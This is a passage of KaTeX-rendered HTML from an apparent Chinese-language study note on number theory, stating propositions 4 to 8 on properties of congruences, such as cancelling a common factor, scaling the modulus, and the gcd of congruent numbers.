style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.1500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>命题4</strong>：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>n</mi><mo stretchy="false">)</mo><mtext>且</mtext><mi>a</mi><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><mi>d</mi><mo separator="true">,</mo><mi>b</mi><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mi>d</mi><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>d</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mtext>则</mtext><msub><mi>a</mi><mn>1</mn></msub><mo>≡</mo><msub><mi>b</mi><mtext> </mtext></msub><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}若a\equiv b~(mod~n)且a=a_1d,b=b_1d,(d,m)=1,则a_1\equiv b_~(mod~m)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord cjk_fallback">且</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-0.15em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mspace nobreak mtight"><span class="mtight"> </span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>命题5</strong>：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>k</mi><mtext>＞</mtext><mn>0</mn><mo separator="true">,</mo><mtext>则</mtext><mi>a</mi><mi>k</mi><mo>≡</mo><mi>b</mi><mi>k</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mi>k</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo stretchy="false">(</mo><mn>2</mn><mo stretchy="false">)</mo><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>d</mi><mtext>是</mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mtext>及</mtext><mi>m</mi><mtext>的任意正公因数</mtext><mo separator="true">,</mo><mtext>则</mtext><mfrac><mi>a</mi><mi>d</mi></mfrac><mo>≡</mo><mfrac><mi>b</mi><mi>d</mi></mfrac><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mfrac><mi>m</mi><mi>d</mi></mfrac><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}(1)若a\equiv b~(mod~m),k＞0,则ak \equiv bk ~(mod ~mk)\\(2)若a \equiv b~(mod~m),d是a,b及m的任意正公因数,则\frac{a}{d} \equiv \frac{b}{d}~(mod~\frac{m}{d})\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4401080000000004em;vertical-align:-0.9700540000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.470054em;"><span style="top:-3.630054em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">＞</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span><span style="top:-2.3899459999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mopen">(</span><span class="mord">2</span><span class="mclose">)</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">是</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">及</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">正</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">数</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">b</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9700540000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>命题6</strong>：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mtext> </mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><msub><mi>m</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>i</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">,</mo><mi>k</mi><mtext>则</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mo stretchy="false">[</mo><msub><mi>m</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>m</mi><mn>2</mn></msub><mo separator="true">,</mo><msub><mi>m</mi><mn>3</mn></msub><mo separator="true">,</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">⋅</mo><mo separator="true">,</mo><msub><mi>m</mi><mi>k</mi></msub><mo stretchy="false">]</mo><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}若a \equiv b~(mod~m_i),i=1,2,3,···,k则a\equiv b(mod~[m_1,m_2,m_3,···,m_k])\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>命题7</strong>：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mtext> </mtext><mo stretchy="false">(</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>d</mi><mo>∣</mo><mi>m</mi><mtext>且</mtext><mi>d</mi><mo>&gt;</mo><mn>0</mn><mo separator="true">,</mo><mtext>则</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>d</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}若a\equiv b~(~mod~m),d\mid m且d&gt;0,则a \equiv b(mod~d)\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2000000000000002em;vertical-align:-0.35000000000000003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8500000000000001em;"><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">且</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35000000000000003em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>命题8</strong>：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>若</mtext><mi>a</mi><mo>≡</mo><mi>b</mi><mtext> </mtext><mo stretchy="false">(</mo><mtext> </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext> </mtext><mi>m</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>b</mi><mo separator="true">,</mo><mi>m</mi><mo stretchy="false">)</mo></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>因而若</mtext><mi>d</mi><mtext>能整除</mtext><mi>m</mi><mtext>及</mtext><mi>a</mi><mtext>，</mtext><mi>b</mi><mtext>二数之一</mtext><mo separator="true">,</mo><mtext>则</mtext><mi>d</mi><mtext>必能整除</mtext><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mtext>中的另一个</mtext></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}若a\equiv b~(~mod~m),则(a,m)=(b,m)\\因而若d能整除m及a，b二数之一,则d必能整除a,b中的另一个\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">若</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal">b</span><span class="mspace nobreak"> </span><span class="mopen">(</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace nobreak"> </span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mopen">(</span><span class="mord mathnormal">b</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">而</span><span class="mord cjk_fallback">若</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">除</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">及</span><span class="mord mathnormal">a</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">二</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">一</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">则</span><span class="mord mathnormal">d</span><span class="mord cjk_fallback">必</span><span class="mord cjk_fallback">能</span><span class="mord cjk_fallback">整</span><span class="mord cjk_fallback">除</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">另</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span></span></span></span></span></p><p><strong>定理2</strong>：</p><p class="katex-block"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable 